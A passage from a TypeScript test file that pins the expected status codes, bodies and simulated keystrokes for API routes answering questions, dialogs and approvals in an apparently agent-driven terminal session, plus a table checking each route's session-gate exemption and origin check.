    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "answered", "answeredBy": "operator", "answer": "Blue"}, "keys": ["project-a-quiet-basin 2"], "feed": ["question answered"]}},
  "POST /api/sessions/:id/ask | held, press refused | the take is rolled back, 409":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"range\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | CAS lost | the ask moved: the press still goes through, the row untouched":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": ["project-a-quiet-basin 2"], "feed": []}},
  "POST /api/sessions/:id/ask | CAS lost, press refused | 409 with the press's word, the row untouched":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"range\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | store refuses | the operator's press goes through unrecorded":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": ["project-a-quiet-basin 2"], "feed": []}},
  "POST /api/sessions/:id/ask | store throws | the operator's press goes through unrecorded":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": ["project-a-quiet-basin 2"], "feed": []}},
  "POST /api/sessions/:id/ask | the take throws | the operator's press goes through unrecorded":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": ["project-a-quiet-basin 2"], "feed": []}},
  "POST /api/sessions/:id/dialog | 1 | an unknown session":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog | 2 | a bad body":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog | press refused | another dialog id: 409, nothing pressed":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"stale-dialog\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog | success | the cursor's row confirmed with Enter":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin Enter"]}},
  "POST /api/sessions/:id/dialog | approval marking | a held approval row is marked operator before the key, even when the press refuses":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"stale-dialog\"}", "effects": {"keys": [], "approval": {"state": "operator", "answeredBy": "operator", "releaseReason": null}}},
  "POST /api/sessions/:id/dialog | approval marking | the hookstate is an AskUserQuestion: the held approval row stays held":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin Enter"], "approval": {"state": "held", "answeredBy": null, "releaseReason": null}}},
  "POST /api/sessions/:id/dialog | approval marking | the hookstate is an approval: the held approval row is marked operator before the key":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin <markApprovalOperator>", "project-a-quiet-basin Enter"], "approval": {"state": "operator", "answeredBy": "operator", "releaseReason": null}}},
  "POST /api/sessions/:id/dialog | approval marking | the store throws: answered anyway":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin Enter"]}},
  "POST /api/sessions/:id/dialog/text | 1 | an unknown session":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/text | 2 | a bad body (no text)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/text | press refused | bad-text is a 400":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-text\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/text | press refused | another dialog id is a 409":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"stale-dialog\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/text | success | walked, proved, typed, echoed, Enter":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin Down", "project-a-quiet-basin Down", "project-a-quiet-basin -l - only in staging, sampled 10%", "project-a-quiet-basin Enter"]}},
  "POST /api/sessions/:id/dialog/multi | 1 | an unknown session":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/multi | 2 | a bad body":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/multi | press refused | bad-indexes is a 400":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-indexes\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/multi | press refused | another dialog id is a 409":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"stale-dialog\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/multi | success | ticked in order, proved, Tab, the next screen back":
    {"status": 200, "body": "sha256:05b4c2c9db0d95cfe1ffc97b1d14591aafb55d90788baec75d7cfbdafef72289", "effects": {"keys": ["project-a-quiet-basin 3", "project-a-quiet-basin 1", "project-a-quiet-basin Tab"]}},
  "POST /api/sessions/:id/dialog/tab | 1 | an unknown session":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/tab | press refused | a bad body is a 400":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/tab | press refused | another dialog id is a 409":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"stale-dialog\"}", "effects": {"keys": []}},
  "POST /api/sessions/:id/dialog/tab | success | already on the review: the screen back, nothing pressed":
    {"status": 200, "body": "sha256:c3e9784426c5dc343d0be146f5483ee8d96e47668fad89f2943ff1f28ebcecf5", "effects": {"keys": []}},
};

describe('question-doors pin: every old door\'s refusals and successes (slug question-census)', () => {
  it('every row has an expectation, and every expectation a row', () => {
    expect(Object.keys(EXPECTED).sort()).toEqual(ALL_ROWS.map(([n]) => n).sort());
    expect(new Set(ALL_ROWS.map(([n]) => n)).size, 'row names are unique').toBe(ALL_ROWS.length);
  });

  it.each(ALL_ROWS)('%s', async (name, run) => {
    expect(await run()).toEqual(EXPECTED[name]);
  });
});

describe('question-doors pin: each door\'s auth posture', () => {
  // The box token and attribution are the claimant doors' (each door's `requireMailToken` row above); the session gate
  // and the origin check are the operator's. A claimant door is exempt from the session gate BY NAME and skips the
  // origin check; an operator door is in neither table, so the gate and the origin check both run.
  const POSTURE: Record<string, { exempt: boolean; originCheck: boolean }> = {
    'POST /api/asks/:id/answer': { exempt: true, originCheck: false },
    'POST /api/asks/:id/release': { exempt: true, originCheck: false },
    'POST /api/approvals': { exempt: true, originCheck: false },
    'POST /api/approvals/:id/rule': { exempt: true, originCheck: false },
    'POST /api/approvals/:id/release': { exempt: true, originCheck: false },
    'POST /api/sessions/:id/ask': { exempt: false, originCheck: true },
    'POST /api/sessions/:id/dialog': { exempt: false, originCheck: true },
    'POST /api/sessions/:id/dialog/text': { exempt: false, originCheck: true },
    'POST /api/sessions/:id/dialog/multi': { exempt: false, originCheck: true },
    'POST /api/sessions/:id/dialog/tab': { exempt: false, originCheck: true },
  };
  it.each(Object.entries(POSTURE))('%s', (route, want) => {
    const [method, url] = route.split(' ') as [string, string];
    expect({ exempt: EXEMPT.has(route), originCheck: needsOriginCheck(method, url, false) }).toEqual(want);
  });
});

